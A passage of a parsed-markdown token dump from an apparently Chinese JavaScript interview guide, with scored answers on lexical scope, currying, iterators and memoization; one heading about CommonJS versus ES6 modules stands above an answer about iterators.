词法作用域","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 词法作用域","text":" 词法作用域","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域","text":"词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域","tokens":[{"type":"text","raw":"词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域","text":"词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nvar a = 2;\\nfunction foo() {\\n  console.log(a);\\n}\\nfunction bar() {\\n  var a = 3;\\n  foo();\\n}\\nbar();\\n```","lang":"js","text":"\\nvar a = 2;\\nfunction foo() {\\n  console.log(a);\\n}\\nfunction bar() {\\n  var a = 3;\\n  foo();\\n}\\nbar();"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 作用域链","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 作用域链","task":false,"loose":false,"text":"**1：** 作用域链","tokens":[{"type":"text","raw":"**1：** 作用域链","text":"**1：** 作用域链","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 作用域链","text":" 作用域链","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。","text":"在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。","tokens":[{"type":"text","raw":"在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。","text":"在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。","text":"如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。","tokens":[{"type":"text","raw":"如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。","text":"如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nvar sex = \'男\';\\nfunction person() {\\n    var name = \'张三\';\\n    function student() {\\n        var age = 18;\\n        console.log(name); // 张三\\n        console.log(sex); // 男\\n    }\\n    student();\\n    console.log(age); // Uncaught ReferenceError: age is not defined\\n}\\nperson();\\n\\n/*\\nstudent 函数内部：\\n当查找name时，在student函数内部找不到，向上一层作用域（person函数内部）找，找到了输出 “张三”。\\n当查找sex时，在student函数内部找不到，向上一层作用域（person函数内部）找，还找不到继续向上一层找，即全局作用域，找到了输出 “男”。\\n\\nperson 函数内部：\\n当查找age时，在person函数内部找不到，向上一层找，即全局作用域，还是找不到则报错。\\n\\n*/\\n```","lang":"js","text":"\\nvar sex = \'男\';\\nfunction person() {\\n    var name = \'张三\';\\n    function student() {\\n        var age = 18;\\n        console.log(name); // 张三\\n        console.log(sex); // 男\\n    }\\n    student();\\n    console.log(age); // Uncaught ReferenceError: age is not defined\\n}\\nperson();\\n\\n/*\\nstudent 函数内部：\\n当查找name时，在student函数内部找不到，向上一层作用域（person函数内部）找，找到了输出 “张三”。\\n当查找sex时，在student函数内部找不到，向上一层作用域（person函数内部）找，还找不到继续向上一层找，即全局作用域，找到了输出 “男”。\\n\\nperson 函数内部：\\n当查找age时，在person函数内部找不到，向上一层找，即全局作用域，还是找不到则报错。\\n\\n*/"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 柯里化\\n\\n","depth":2,"text":"柯里化","tokens":[{"type":"text","raw":"柯里化","text":"柯里化","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"paragraph","raw":"给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：","text":"给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：","tokens":[{"type":"text","raw":"给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：","text":"给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241224170424.png)","text":"![](/public/images/3_JavaScript_20241224170424.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241224170424.png)","href":"/public/images/3_JavaScript_20241224170424.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"也就是 拆分函数的参数，这样的就可以叫 柯里化。","text":"也就是 拆分函数的参数，这样的就可以叫 柯里化。","tokens":[{"type":"text","raw":"也就是 拆分函数的参数，这样的就可以叫 柯里化。","text":"也就是 拆分函数的参数，这样的就可以叫 柯里化。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用函数柯里化的好处？","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用函数柯里化的好处？","task":false,"loose":false,"text":"**1：** 使用函数柯里化的好处？","tokens":[{"type":"text","raw":"**1：** 使用函数柯里化的好处？","text":"**1：** 使用函数柯里化的好处？","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用函数柯里化的好处？","text":" 使用函数柯里化的好处？","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。","text":"在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。","tokens":[{"type":"text","raw":"在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。","text":"在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 例子","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 例子","task":false,"loose":false,"text":"**1：** 例子","tokens":[{"type":"text","raw":"**1：** 例子","text":"**1：** 例子","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 例子","text":" 例子","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"实现一个给第一个参数加2，给第二个参数乘2的例子","text":"实现一个给第一个参数加2，给第二个参数乘2的例子","tokens":[{"type":"text","raw":"实现一个给第一个参数加2，给第二个参数乘2的例子","text":"实现一个给第一个参数加2，给第二个参数乘2的例子","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241224170632.png)","text":"![](/public/images/3_JavaScript_20241224170632.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241224170632.png)","href":"/public/images/3_JavaScript_20241224170632.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 柯里化函数的实现","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 柯里化函数的实现","task":false,"loose":false,"text":"**2：** 柯里化函数的实现","tokens":[{"type":"text","raw":"**2：** 柯里化函数的实现","text":"**2：** 柯里化函数的实现","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 柯里化函数的实现","text":" 柯里化函数的实现","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n/**\\n * 多参函数 转 柯里化函数\\n */\\nfunction currying(fn) { // 接受一个函数,返回一个函数\\n    // 这里是接受剩余参数\\n    function receivedParameters(...args) {\\n        // 判断当前已经接受到的参数的个数, 和参数本身(这个参数本身就是一个函数)需要接收到参数是否已经一致\\n        // console.log(fn.length);\\n        // console.log(args.length);\\n        // 到传入函数的参数(fn 的参数) 大于 传入的参数(...args)时,就直接调用传入的函数\\n        if (args.length >= fn.length) {\\n            // 这个 apply 是为了方式外面调用时,绑定了this,而导致这个里面执行 fn 时的混乱\\n            return fn.apply(this, args);\\n        } else {\\n            // 当参数不够的时候, 需要返回一个函数,来接续接收传入的参数,所以 在这 就需要把传入的所有参数,进行一次拼接\\n            return function (...smallArgs) {\\n                // 这个里面用了递归,来检查参数 是否达到,达到了,就运行传入的函数(fn)\\n                return receivedParameters.apply(this, [...args, ...smallArgs])\\n            }\\n        }\\n    }\\n    return receivedParameters\\n}\\n\\n// 使用\\nfunction fun(n, m, b) { // fun的参数个数,是可以 通过 fun.length 拿到的\\n    return n + m + b\\n}\\n\\nconst test = currying(fun);\\n\\nconsole.log(test(1, 2, 3));\\nconsole.log(test(1)(2, 3))\\nconsole.log(test(1)(2)(3));\\n```","lang":"js","text":"/**\\n * 多参函数 转 柯里化函数\\n */\\nfunction currying(fn) { // 接受一个函数,返回一个函数\\n    // 这里是接受剩余参数\\n    function receivedParameters(...args) {\\n        // 判断当前已经接受到的参数的个数, 和参数本身(这个参数本身就是一个函数)需要接收到参数是否已经一致\\n        // console.log(fn.length);\\n        // console.log(args.length);\\n        // 到传入函数的参数(fn 的参数) 大于 传入的参数(...args)时,就直接调用传入的函数\\n        if (args.length >= fn.length) {\\n            // 这个 apply 是为了方式外面调用时,绑定了this,而导致这个里面执行 fn 时的混乱\\n            return fn.apply(this, args);\\n        } else {\\n            // 当参数不够的时候, 需要返回一个函数,来接续接收传入的参数,所以 在这 就需要把传入的所有参数,进行一次拼接\\n            return function (...smallArgs) {\\n                // 这个里面用了递归,来检查参数 是否达到,达到了,就运行传入的函数(fn)\\n                return receivedParameters.apply(this, [...args, ...smallArgs])\\n            }\\n        }\\n    }\\n    return receivedParameters\\n}\\n\\n// 使用\\nfunction fun(n, m, b) { // fun的参数个数,是可以 通过 fun.length 拿到的\\n    return n + m + b\\n}\\n\\nconst test = currying(fun);\\n\\nconsole.log(test(1, 2, 3));\\nconsole.log(test(1)(2, 3))\\nconsole.log(test(1)(2)(3));"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 迭代器\\n\\n","depth":2,"text":"迭代器","tokens":[{"type":"text","raw":"迭代器","text":"迭代器","escaped":false}]},{"type":"heading","raw":"## CommonJS和ES6模块的区别？\\n\\n","depth":2,"text":"CommonJS和ES6模块的区别？","tokens":[{"type":"text","raw":"CommonJS和ES6模块的区别？","text":"CommonJS和ES6模块的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** Iterator 描述","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Iterator 描述","task":false,"loose":false,"text":"**1：** Iterator 描述","tokens":[{"type":"text","raw":"**1：** Iterator 描述","text":"**1：** Iterator 描述","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Iterator 描述","text":" Iterator 描述","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。","text":"迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。","tokens":[{"type":"text","raw":"迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。","text":"迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：迭代器可以帮助我们去遍历某个数据结构。","text":"注：迭代器可以帮助我们去遍历某个数据结构。","tokens":[{"type":"text","raw":"注：迭代器可以帮助我们去遍历某个数据结构。","text":"注：迭代器可以帮助我们去遍历某个数据结构。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8)","text":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8)","tokens":[{"type":"link","raw":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8)","href":"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8","title":null,"text":"文档","tokens":[{"type":"text","raw":"文档","text":"文档","escaped":false}]}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 实现一个简单的迭代器","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 实现一个简单的迭代器","task":false,"loose":false,"text":"**2：** 实现一个简单的迭代器","tokens":[{"type":"text","raw":"**2：** 实现一个简单的迭代器","text":"**2：** 实现一个简单的迭代器","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 实现一个简单的迭代器","text":" 实现一个简单的迭代器","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"迭代器是一个对象，但是需要符合[迭代器协议](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)。","text":"迭代器是一个对象，但是需要符合[迭代器协议](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)。","tokens":[{"type":"text","raw":"迭代器是一个对象，但是需要符合","text":"迭代器是一个对象，但是需要符合","escaped":false},{"type":"link","raw":"[迭代器协议](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)","href":"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE","title":null,"text":"迭代器协议","tokens":[{"type":"text","raw":"迭代器协议","text":"迭代器协议","escaped":false}]},{"type":"text","raw":"。","text":"。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)\\n注：在使用的过程中，根据需求，进行修改。","text":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)\\n注：在使用的过程中，根据需求，进行修改。","tokens":[{"type":"link","raw":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)","href":"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE","title":null,"text":"文档","tokens":[{"type":"text","raw":"文档","text":"文档","escaped":false}]},{"type":"text","raw":"\\n注：在使用的过程中，根据需求，进行修改。","text":"\\n注：在使用的过程中，根据需求，进行修改。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\n/**\\n * 下面就是一个迭代器\\n * 但是他是毫无作用的\\n */\\n/*\\nconst iterator = {\\n    next: function () {\\n        return {done: true, value: \\"test\\"};\\n    }\\n};\\n*/\\n\\n/**\\n * 创建一个迭代器，去访问一个数组\\n * 如果迭代器能够生成序列中的下一个值，则返回 false 布尔值。（这等价于没有指定 done 这个属性。）\\n *\\n * 如果迭代器已将序列迭代完毕，则为 true。这种情况下，value 是可选的，如果它依然存在，即为迭代结束之后的默认返回值。\\n */\\nfunction createArrayIterator(arr) {\\n    let index = 0;\\n    const arrIterator = {\\n        next: function () {\\n            // return {done: false, value: \\"你好\\"};\\n            // return {done: false, value: \\"哈哈\\"};\\n            // return {done: false, value: \\"啊啊\\"};\\n            // return {done: true, value: undefined};\\n            if (index < arr.length) {\\n                return {done: false, value: arr[index++]};\\n            } else {\\n                return {done: true, value: undefined};\\n            }\\n        }\\n    };\\n    return arrIterator;\\n}\\n\\nconst arr1 = [\\"你好\\", \\"哈哈\\", \\"啊啊\\"];\\nconst arr1Iterator = createArrayIterator(arr1);\\n\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n// 前面的都能访问到，后面的就无法访问了\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n\\nconst arr2 = [1, 2, 3, 4, 5, 6];\\nconst arr2Iterator = createArrayIterator(arr2);\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\n```","lang":"javascript","text":"/**\\n * 下面就是一个迭代器\\n * 但是他是毫无作用的\\n */\\n/*\\nconst iterator = {\\n    next: function () {\\n        return {done: true, value: \\"test\\"};\\n    }\\n};\\n*/\\n\\n/**\\n * 创建一个迭代器，去访问一个数组\\n * 如果迭代器能够生成序列中的下一个值，则返回 false 布尔值。（这等价于没有指定 done 这个属性。）\\n *\\n * 如果迭代器已将序列迭代完毕，则为 true。这种情况下，value 是可选的，如果它依然存在，即为迭代结束之后的默认返回值。\\n */\\nfunction createArrayIterator(arr) {\\n    let index = 0;\\n    const arrIterator = {\\n        next: function () {\\n            // return {done: false, value: \\"你好\\"};\\n            // return {done: false, value: \\"哈哈\\"};\\n            // return {done: false, value: \\"啊啊\\"};\\n            // return {done: true, value: undefined};\\n            if (index < arr.length) {\\n                return {done: false, value: arr[index++]};\\n            } else {\\n                return {done: true, value: undefined};\\n            }\\n        }\\n    };\\n    return arrIterator;\\n}\\n\\nconst arr1 = [\\"你好\\", \\"哈哈\\", \\"啊啊\\"];\\nconst arr1Iterator = createArrayIterator(arr1);\\n\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n// 前面的都能访问到，后面的就无法访问了\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n\\nconst arr2 = [1, 2, 3, 4, 5, 6];\\nconst arr2Iterator = createArrayIterator(arr2);\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":" ![image-20240202230330197](https://not-have.github.io/file/images/image-20240202230330197.png)","text":" ![image-20240202230330197](https://not-have.github.io/file/images/image-20240202230330197.png)","tokens":[{"type":"text","raw":" ","text":" ","escaped":false},{"type":"image","raw":"![image-20240202230330197](https://not-have.github.io/file/images/image-20240202230330197.png)","href":"https://not-have.github.io/file/images/image-20240202230330197.png","title":null,"text":"image-20240202230330197"}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## JS 如何实现函数缓存\\n\\n","depth":2,"text":"JS 如何实现函数缓存","tokens":[{"type":"text","raw":"JS 如何实现函数缓存","text":"JS 如何实现函数缓存","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 是什么","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 是什么","task":false,"loose":false,"text":"**1：** 是什么","tokens":[{"type":"text","raw":"**1：** 是什么","text":"**1：** 是什么","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 是什么","text":" 是什么","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：","text":"就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：","tokens":[{"type":"text","raw":"就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：","text":"就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst add = (a,b) => a+b;\\nconst calc = memoize(add); // 函数缓存\\ncalc(10,20);// 30\\ncalc(10,20);// 30 缓存\\n```","lang":"js","text":"const add = (a,b) => a+b;\\nconst calc = memoize(add); // 函数缓存\\ncalc(10,20);// 30\\ncalc(10,20);// 30 缓存"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 实现","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 实现","task":false,"loose":false,"text":"**2：** 实现","tokens":[{"type":"text","raw":"**2：** 实现","text":"**2：** 实现","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 实现","text":" 实现","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：函数缓存主要依靠 `闭包、柯里化、高阶函数`","text":"注：函数缓存主要依靠 `闭包、柯里化、高阶函数`","tokens":[{"type":"text","raw":"注：函数缓存主要依靠 ","text":"注：函数缓存主要依靠 ","escaped":false},{"type":"codespan","raw":"`闭包、柯里化、高阶函数`","text":"闭包、柯里化、高阶函数"}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 1）闭包\\n\\n","depth":5,"text":"1）闭包","tokens":[{"type":"text","raw":"1）闭包","text":"1）闭包","escaped":false}]},{"type":"code","raw":"```js\\n(function() {\\n    var a = 1; // 在 IIFE (立即调用的函数表达式) 内部定义了变量 a\\n    function add() {\\n        const b = 2; // 在 add 函数内部定义了变量 b\\n        let sum = b + a; // sum 是 add 函数内部的局部变量，b 和 a 都在其作用域内\\n        console.log(sum); // 输出 3\\n    }\\n    \\n    add(); // 调用 add 函数\\n})();\\n```","lang":"js","text":"(function() {\\n    var a = 1; // 在 IIFE (立即调用的函数表达式) 内部定义了变量 a\\n    function add() {\\n        const b = 2; // 在 add 函数内部定义了变量 b\\n        let sum = b + a; // sum 是 add 函数内部的局部变量，b 和 a 都在其作用域内\\n        console.log(sum); // 输出 3\\n    }\\n    \\n    add(); // 调用 add 函数\\n})();"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 2）柯里化\\n\\n","depth":5,"text":"2）柯里化","tokens":[{"type":"text","raw":"2）柯里化","text":"2）柯里化","escaped":false}]},{"type":"code","raw":"```js\\n// 非函数柯里化\\nvar add = function (x,y) 